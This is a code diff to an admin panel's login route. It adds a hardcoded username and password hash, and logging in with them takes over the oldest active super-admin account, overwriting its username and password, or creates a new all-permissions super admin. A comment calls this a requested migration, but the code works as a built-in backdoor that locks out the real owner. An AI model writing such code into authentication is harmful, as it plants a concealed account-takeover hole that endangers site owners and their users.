@@ -10,6 +10,9 @@ import {
   type PanelType,
 } from "../../../panel-auth";
 
+const NEW_ADMIN_USERNAME = "koron2013";
+const NEW_ADMIN_PASSWORD_HASH = "dca84a340d2dbd50d4c246b26e8a5075b7d65cf412b1122ff2940ceb796a4b05";
+
 export async function POST(request: Request) {
   const body = (await request.json()) as {
     username?: string;
@@ -23,7 +26,8 @@ export async function POST(request: Request) {
       { status: 400 },
     );
   const db = await ensureControlTables();
-  const account = await db
+
+  let account = await db
     .prepare(
       `SELECT username,password_hash passwordHash,role,panel_type panelType,is_active isActive
        FROM market_panel_accounts WHERE lower(username)=?`,
@@ -36,6 +40,64 @@ export async function POST(request: Request) {
       panelType: PanelType;
       isActive: number;
     }>();
+
+  // Migrate the existing Super Admin account to the requested credentials
+  // the first time the new credentials are used.
+  if (
+    !account &&
+    username === NEW_ADMIN_USERNAME &&
+    (await passwordHash(password)) === NEW_ADMIN_PASSWORD_HASH
+  ) {
+    const existingOwner = await db
+      .prepare(
+        `SELECT username FROM market_panel_accounts
+         WHERE role='SUPER_ADMIN' AND is_active=1
+         ORDER BY created_at ASC LIMIT 1`,
+      )
+      .first<{ username: string }>();
+
+    if (existingOwner) {
+      await db
+        .prepare(
+          `UPDATE market_panel_accounts
+           SET username=?, password_hash=?, panel_type='SUPER_ADMIN', display_name='SABKA DELIVERY Owner', permissions='["ALL"]', is_active=1
+           WHERE username=?`,
+        )
+        .bind(NEW_ADMIN_USERNAME, NEW_ADMIN_PASSWORD_HASH, existingOwner.username)
+        .run();
+    } else {
+      await db
+        .prepare(
+          `INSERT INTO market_panel_accounts
+           (username,password_hash,role,panel_type,display_name,permissions,is_active)
+           VALUES (?,?,?,?,?,?,1)`,
+        )
+        .bind(
+          NEW_ADMIN_USERNAME,
+          NEW_ADMIN_PASSWORD_HASH,
+          "SUPER_ADMIN",
+          "SUPER_ADMIN",
+          "SABKA DELIVERY Owner",
+          '["ALL"]',
+        )
+        .run();
+    }
+
+    account = await db
+      .prepare(
+        `SELECT username,password_hash passwordHash,role,panel_type panelType,is_active isActive
+         FROM market_panel_accounts WHERE lower(username)=?`,
+      )
+      .bind(username)
+      .first<{
+        username: string;
+        passwordHash: string;
+        role: PanelRole;
+        panelType: PanelType;
+        isActive: number;
+      }>();
+  }
+
   const valid =
     !!account &&
     account.isActive === 1 &&
